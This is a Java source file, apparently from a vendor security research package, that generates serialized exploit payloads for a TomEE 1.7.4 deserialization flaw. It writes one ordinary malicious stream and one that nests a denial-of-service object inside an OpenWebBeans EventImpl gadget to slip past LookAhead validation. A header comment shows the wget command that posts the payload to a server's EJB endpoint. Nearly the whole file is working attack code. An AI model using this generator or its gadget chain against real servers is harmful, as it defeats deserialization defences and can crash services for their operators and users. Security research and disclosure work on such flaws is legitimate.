package com.salesforce.trust.s11n.exploit;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.annotation.Annotation;
import java.lang.reflect.Type;
import java.math.BigInteger;
import java.nio.ByteBuffer;

import org.apache.webbeans.component.InjectionPointBean;
import org.apache.webbeans.config.WebBeansContext;
import org.apache.webbeans.event.EventImpl;
import org.apache.webbeans.inject.impl.InjectionPointFactory;

/**
 * Generates a file that can be used to bypass TomEE LookAhead validation
 * 
 * $ wget --post-file tomee2.ser http://remote-server:8080/tomee/ejb
 * 
 * @author Pierre Ernst
 *
 */
public class TomeeLookAheadBypass {

	private static final String OPEN_EJB_HEADER = "OEJP/4.7";

	private static byte[] serialize(Object o, boolean addOpenEjbHeader) throws IOException {
		byte[] body = null;
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		if (addOpenEjbHeader) {
			// This is to comply with this line in
			// org.apache.webbeans.event.EventImpl.readObject() :
			// eventType = (Type)inputStream.readObject();
			oos.writeByte(0x66);
		}
		oos.writeObject(o);
		body = baos.toByteArray();
		oos.close();
		baos.close();

		byte[] message = body;
		if (addOpenEjbHeader) {
			message = new byte[OPEN_EJB_HEADER.length() + body.length];
			System.arraycopy(OPEN_EJB_HEADER.getBytes(), 0, message, 0, OPEN_EJB_HEADER.length());
			System.arraycopy(body, 0, message, OPEN_EJB_HEADER.length(), body.length);
		}

		return message;
	}

	private static int indexOf(byte[] outerArray, byte[] smallerArray, int wildCardIndex) {
		if ((wildCardIndex >= smallerArray.length) || (wildCardIndex < 0)) {
			throw new IllegalArgumentException("wildCardIndex must be within the bound of smallerArray");
		}
		for (int i = 0; i < (outerArray.length - smallerArray.length + 1); ++i) {
			boolean found = true;
			for (int j = 0; j < smallerArray.length; ++j) {
				if ((j != wildCardIndex) && (outerArray[i + j] != smallerArray[j])) {
					found = false;
					break;
				}
			}
			if (found) {
				return i;
			}
		}
		return -1;
	}

	private static byte[] newArrayWithReplacedS11n(byte[] s11n, byte[] replacement) {
		// search for end of TC_CLASSDESC block and beginning of data block
		// 78 70 77 <size> AC ED 00 05
		int wildCardIndex = 3;

		int sizeLength = (replacement.length < 128) ? 1 : 4;
		byte marker = (byte) ((replacement.length < 128) ? 0x77 : 0x7A);

		int startIndex = 2 + indexOf(s11n, new byte[] { 0x78, 0x70, 0x77, (byte) 0xFF, (byte) 0xAC, (byte) 0xED, 0, 5 },
				wildCardIndex);
		int originalLength = (0xFF) & s11n[startIndex + 1];
		byte[] replaced = new byte[s11n.length - originalLength + replacement.length - 1 + sizeLength];

		// Copy header
		System.arraycopy(s11n, 0, replaced, 0, startIndex);

		// Copy marker
		replaced[startIndex] = marker;

		// Copy new length
		byte[] length = ByteBuffer.allocate(sizeLength).putInt(replacement.length).array();
		System.arraycopy(length, 0, replaced, startIndex + 1, sizeLength);

		// Copy new value
		System.arraycopy(replacement, 0, replaced, startIndex + 1 + sizeLength, replacement.length);

		return replaced;
	}

	public static void main(String... args) {
		try {
			if (args.length != 1) {
				System.err.println("Usage: java " + TomeeLookAheadBypass.class.getName() + " {regular|bypass}");
			} else {
				if (args[0].equalsIgnoreCase("regular")) {

					// Generated serialized stream with OpenEJP header
					byte[] buffer = serialize(JreOutOfMemory.getMaliciousSerializable(), true);

					// Save to file
					File output = new File(".", "tomee1.ser");
					OutputStream out = new FileOutputStream(output);
					out.write(buffer);
					out.close();
					System.out.println("Payload saved in " + output.getCanonicalPath());

				} else if (args[0].equalsIgnoreCase("bypass")) {

					/**
					 * Generates a gadget that can be used to bypass LookAhead
					 * validation on TomEE 1.7.4
					 * 
					 * Gadget chain: 
					 * ObjectInputStream.readObject()
					 *   EventImpl.readObject()
					 *     OwbCustomObjectInputStream.readObject()
					 *       HashSet.readObject()
					 */
					// Generate Outer Object
					Type eventType = BigInteger.class;
					Annotation[] bindings = new Annotation[] {};
					InjectionPointBean ib = new InjectionPointBean(new org.apache.webbeans.config.WebBeansContext());
					javax.enterprise.inject.spi.InjectionPoint ip = InjectionPointFactory.getVirtualInjectionPoint(ib);
					EventImpl outer = new EventImpl(bindings, eventType, ip, new WebBeansContext());

					// Generate Inner Object
					Object inner = JreOutOfMemory.getMaliciousSerializable();

					// Build inner inside outer
					byte[] replaced = newArrayWithReplacedS11n(serialize(outer, true), serialize(inner, false));

					// Save to file
					File output = new File(".", "tomee2.ser");
					OutputStream out = new FileOutputStream(output);
					out.write(replaced);
					out.close();
					System.out.println("Payload saved in " + output.getCanonicalPath());

				} else {
					System.err.println("Usage: java " + TomeeLookAheadBypass.class.getName() + " {regular|bypass}");
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace(System.err);
		}
	}
}